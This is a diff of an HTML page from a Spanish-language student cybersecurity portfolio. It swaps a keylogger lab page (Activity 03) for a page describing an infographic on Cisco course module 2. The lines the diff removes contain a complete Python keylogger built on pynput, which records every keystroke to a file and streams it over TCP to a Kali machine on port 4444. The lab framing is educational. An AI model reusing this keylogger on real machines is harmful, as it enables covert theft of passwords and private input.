@@ -3,8 +3,8 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Actividad 03 - No presiones Esc… todavía</title>
-<meta name="description" content="Parcial 1, Actividad 1: introducción a la captura de eventos de teclado con la librería pynput, en el contexto de seguridad informática.">
+<title>Actividad 14 - Ciberseguridad en una mirada</title>
+<meta name="description" content="Parcial 1, Actividad 14: Infografía profesional sobre ataques, conceptos y técnicas basada en el curso Introduction to Cybersecurity de Cisco.">
 
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -46,8 +46,8 @@
             Actividades <span class="chev" aria-hidden="true">▾</span>
           </span>
           <ul class="dropdown-menu">
-            <li><a class="dropdown-link active" href="/portafolioCNOIV/actividades/parcial1/actsP1.html" class="active">Parcial 1</a></li>
-            <li><a class="dropdown-link" href="/portafolioCNOIV/actividades/parcial2/actsP2.html" >Parcial 2</a></li>            
+            <li><a class="dropdown-link " href="/portafolioCNOIV/actividades/parcial1/actsP1.html">Parcial 1</a></li>
+            <li><a class="dropdown-link active" href="/portafolioCNOIV/actividades/parcial2/actsP2.html">Parcial 2</a></li>            
             <li><span class="disabled-link" aria-disabled="true" title="Disponible próximamente">Parcial 3 <em>· próximamente</em></span></li>
           </ul>
         </li>
@@ -76,12 +76,13 @@
 
   <!-- ===================== ENCABEZADO DE ACTIVIDAD ===================== -->
   <section class="activity-hero">
-    <span class="section-index">Parcial 1 · Actividad 03</span>
-    <h1>No presiones Esc… <code>todavía</code></h1>
+    <span class="section-index">Parcial 2 · Actividad 14</span>
+    <h1>Ciberseguridad en una mirada</h1>
+    <h1><code>Módulo 2: Ataques y Técnicas</code></h1>
     <p class="hero-lede">
-      Ejercicio de seguridad informática orientado a comprender, desde el lado
-      defensivo, cómo funciona la captura de eventos de entrada a nivel de sistema operativo:
-      la base técnica de amenazas como los keyloggers y de las estrategias para detectarlas.
+      Diseño de una infografía profesional orientada a la concientización organizacional,
+      explicando de manera visual y estructurada los conceptos del Módulo 2 del curso 
+      <em>Introduction to Cybersecurity</em> de Cisco Networking Academy.
     </p>
   </section>
 
@@ -97,12 +98,11 @@
           <h2>Introducción</h2>
         </div>
         <p class="body-copy">
-          En esta práctica se implementó un programa en Python utilizando la librería pynput para capturar 
-          eventos de teclado en un entorno controlado de laboratorio. El propósito fue comprender cómo 
-          funcionan los event hooks y callbacks, así como explorar el envío de registros hacia una máquina 
-          Kali Linux mediante sockets TCP. Esta actividad se relaciona con el concepto de keylogging, el cual, 
-          aunque puede ser usado de forma maliciosa, aquí se estudia con fines académicos y de aprendizaje en 
-          ciberseguridad.
+          Esta actividad consistió en el diseño de una infografía profesional en formato vertical 
+          que sintetiza los conceptos clave abordados en el curso <em>Introduction to Cybersecurity</em> 
+          de Cisco Networking Academy (Módulo 2: Ataques, Conceptos y Técnicas). El propósito principal 
+          radica en comunicar de forma visual, clara y estratégica los riesgos informáticos a los que se enfrentan 
+          las organizaciones, así como las medidas de mitigación necesarias para salvaguardar la información.
         </p>
       </section>
 
@@ -113,92 +113,44 @@
           <h2>Objetivo</h2>
         </div>
         <p class="body-copy">
-         El objetivo principal de la práctica fue desarrollar y documentar un programa que registre eventos de teclado, 
-         los asocie temporalmente y transmita la información hacia un receptor en Kali Linux, con el fin de 
-         analizar su funcionamiento técnico y reflexionar sobre sus implicaciones en seguridad informática.
+          Diseñar un producto visual profesional orientado a la concientización y divulgación técnica, 
+          demostrando capacidad de síntesis, precisión conceptual e integración de fundamentos teóricos con 
+          la aplicación práctica en ciberseguridad.
         </p>
       </section>
 
-      <!-- ===================== CÓDIGO ===================== -->
-      <section class="section" id="codigo">
+      <!-- ===================== DESCRIPCIÓN DEL CONTENIDO DE LA INFOGRAFÍA ===================== -->
+      <section class="section" id="contenido-infografia">
         <div class="section-head">
           <span class="section-index">03</span>
-          <h2>Código</h2>
+          <h2>Estructura de la Infografía</h2>
         </div>
-        <div class="code-block">
-          <div class="code-block-bar">
-            <span>act3.py</span>
-          </div>
-          <pre><code>from pynput import keyboard
-
-import socket
-from pynput.keyboard import Key, Listener
-from datetime import datetime
-
-# Configuración de conexión hacia Kali
-HOST = "192.168.1.75"  
-PORT = 4444
-
-# Crear archivo vacío al inicios
-with open("Caracteres.txt", "w", encoding="utf-8") as file:
-    file.write("Registro de eventos iniciado\n")
-
-# Crear socket y conectar a Kali
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect((HOST, PORT))
-
-i = 0
-
-def registrar_evento(tipo, tecla):
-    global i
-    i += 1
-    fecha_formateada = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
-    registro = f"{fecha_formateada} | {tipo} | {tecla} | evento_{i:03d}\n"
-    
-    # Persistencia local
-    with open("Caracteres.txt", "a", encoding="utf-8") as file:
-        file.write(registro)
-    
-    # Envío a Kali
-    try:
-        sock.sendall(registro.encode())
-    except Exception as e:
-        print(f"Error al enviar: {e}")
-
-def on_press(key):
-    try:
-        tecla = key.char
-    except AttributeError:
-        tecla = str(key)
-    registrar_evento("PRESS", tecla)
-
-def on_release(key):
-    registrar_evento("RELEASE", str(key))
-    if key == Key.esc:
-        sock.close()
-        return False
-
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
-</code></pre>
-        </div>
-        
+        <p class="body-copy">
+          La infografía desarrollada integra los siguientes apartados estratégicos:
+        </p>
+        <ul class="concept-list">
+          <li><strong>¿Qué es un ciberataque?: </strong> Intento deliberado de acceder, dañar o interrumpir sistemas, redes o datos sin autorización para obtener un beneficio o causar perjuicio.</li>
+          <li><strong>Lógica del ataque: </strong> Secuencia compuesta por Amenaza, Vulnerabilidad, Ataque (Exploit) e Impacto.</li>
+          <li><strong>Tipos principales de Malware: </strong> Clasificación visual detallada de Virus, Gusanos (Worms), Troyanos, Spyware, Ransomware y Adware.</li>
+          <li><strong>Vulnerabilidades y Exploits: </strong> Definición técnica de debilidades de los sistemas y los mecanismos utilizados para explotarlas.</li>
+          <li><strong>Medidas de mitigación: </strong> Prácticas clave como actualización de software, capacitación contra ingeniería social (phishing), contraseñas robustas, MFA, backups y controles de acceso.</li>
+        </ul>
       </section>
 
-      <!-- ===================== CONCEPTOS PRINCIPALES ===================== -->
-      <section class="section" id="conceptos">
+      <!-- ===================== VISUALIZADOR DE LA INFOGRAFÍA (PDF) ===================== -->
+      <section class="section" id="visualizador-pdf">
         <div class="section-head">
           <span class="section-index">04</span>
-          <h2>Conceptos principales</h2>
+          <h2>Infografía</h2>
         </div>
-        <ul class="concept-list">
-          <li><strong>Event hooks: </strong> mecanismos que permiten interceptar la entrada del teclado.</li>
-          <li><strong>Callbacks: </strong> funciones que procesan cada evento capturado.</li>
-          <li><strong>Persistencia de registros: </strong> almacenamiento de los eventos en un archivo local (Caracteres.txt).</li>
-          <li><strong>Sockets TCP: </strong> protocolo de comunicación usado para enviar los registros a Kali Linux.</li>
-          <li><strong> Keylogging: </strong> técnica de captura de teclas, estudiada aquí en un entorno académico para comprender riesgos y defensas.</li>
-
-        </ul>
+        <p class="body-copy">
+          A continuación se muestra el documento PDF integrado directamente en la página para su consulta interactiva:
+        </p>
+        <div class="pdf-viewer-container" style="margin-top: 1.5rem; border: 1px solid var(--border-color, #333); border-radius: 8px; overflow: hidden; background: #1e1e1e;">
+          <iframe src="/portafolioCNOIV/actividades/descargas/infografia_act14.pdf" width="100%" height="700px" style="border: none;">
+            <p>Tu navegador no soporta la visualización de PDFs. Puedes descargar el archivo directamente desde el botón de la barra lateral.</p>
+          </iframe>
+        </div>
       </section>
 
       <!-- ===================== APRENDIZAJES OBTENIDOS ===================== -->
@@ -208,19 +160,13 @@ with Listener(on_press=on_press, on_release=on_release) as listener:
           <h2>Aprendizajes obtenidos</h2>
         </div>
         <p class="body-copy">
-          Comprender cómo interceptar y procesar eventos de teclado en Python.
+          Sintetizar información técnica compleja en esquemas visuales limpios y fáciles de interpretar por audiencias no especializadas.
         </p>
         <p class="body-copy">
-          Implementar persistencia de registros con fecha, hora y un identificador único por evento.
+          Comprender a profundidad la taxonomía del malware y la lógica detrás de la materialización de riesgos cibernéticos.
         </p>
         <p class="body-copy">
-          Configurar la comunicación entre Windows y Kali Linux mediante sockets TCP.
-        </p>
-        <p class="body-copy">
-          Reconocer la relación entre estas técnicas y el concepto de keylogging.
-        </p>
-        <p class="body-copy">
-          Reflexionar sobre la importancia de aplicar medidas de protección frente a posibles usos maliciosos.
+          Vincular los conceptos teóricos de Cisco Networking Academy con estrategias defensivas reales y aplicables en entornos organizacionales.
         </p>
       </section>
 
@@ -231,20 +177,21 @@ with Listener(on_press=on_press, on_release=on_release) as listener:
           <h2>Conclusión</h2>
         </div>
         <p class="body-copy">
-          Al realizar esta práctica comprendí de manera más clara cómo funcionan los event hooks y callbacks en Python, 
-          y cómo se pueden aprovechar para capturar y procesar eventos de teclado. Me resultó interesante ver que 
-          cada tecla podía registrarse con precisión en un archivo y, además, transmitirse hacia otra máquina como Kali Linux. 
-          Esto me permitió experimentar con la comunicación entre sistemas y entender mejor los riesgos asociados a técnicas como el keylogging.
+          El desarrollo de esta infografía permitió consolidar los conocimientos sobre las amenazas más comunes 
+          en la ciberseguridad moderna. Se demostró que la comunicación visual efectiva es una herramienta poderosa 
+          para la concientización organizacional, ayudando a que los usuarios comprendan que la seguridad no recae 
+          únicamente en soluciones tecnológicas, sino en una cultura preventiva integral.
         </p>
-        <p class="body-copy">
-          El uso de <code>pynput</code> facilitó la comprensión de la programación orientada a eventos y
-          de cómo el sistema operativo expone los eventos de entrada a nivel de aplicación.
-        </p>
-        <p class="body-copy">
-          Como aprendizaje principal, se destaca que capacidades técnicamente sencillas —como escuchar
-          eventos de teclado— pueden convertirse en un riesgo relevante si se combinan con persistencia y
-          transmisión no autorizada; estudiarlas en un entorno controlado y ético permite fortalecer los
-          criterios de detección y defensa frente a amenazas de este tipo.
+      </section>
+
+      <!-- ===================== REFERENCIAS ===================== -->
+      <section class="section" id="referencias">
+        <div class="section-head">
+          <span class="section-index">07</span>
+          <h2>Referencias</h2>
+        </div>
+        <p class="body-copy" style="font-size: 0.95rem; line-height: 1.5;">
+          Cisco Networking Academy. (s. f.). <em>Introduction to Cybersecurity: Module 2 - Attacks, concepts and techniques</em>. Cisco.
         </p>
       </section>
 
@@ -256,25 +203,25 @@ with Listener(on_press=on_press, on_release=on_release) as listener:
         <h3>Datos de la actividad</h3>
         <dl>
           <div class="sidebar-meta-item">
-            <dt>Fecha</dt>
-            <dd>24/08/2026</dd>
+            <dt>Módulo</dt>
+            <dd>Cisco - Módulo 2</dd>
           </div>
           <div class="sidebar-meta-item">
-            <dt>Tecnologías</dt>
-            <dd>Python, librería <code>pynput</code></dd>
+            <dt>Formato</dt>
+            <dd>Infografía Vertical (PDF)</dd>
           </div>
           <div class="sidebar-meta-item">
             <dt>Entregable</dt>
-            <dd>Script comentado + reporte en PDF</dd>
+            <dd>Reporte visual en PDF</dd>
           </div>
         </dl>
       </div>
 
       <div class="sidebar-card sidebar-download">
         <span class="sidebar-download-icon" aria-hidden="true">⭳</span>
-        <h3>PDF de la actividad</h3>
-        <p>Reporte con introducción, objetivo, código, conceptos y conclusión de esta actividad.</p>
-        <a class="btn btn-primary btn-block" href="/portafolioCNOIV/actividades/descargas/MoralesMeza-act03.pdf" download>
+        <h3>Infografía en PDF</h3>
+        <p>Descarga la infografía profesional completa sobre ataques, conceptos y técnicas de ciberseguridad.</p>
+        <a class="btn btn-primary btn-block" href="/portafolioCNOIV/actividades/descargas/infografia_act14.pdf" download>
           Descargar PDF
         </a>
       </div>
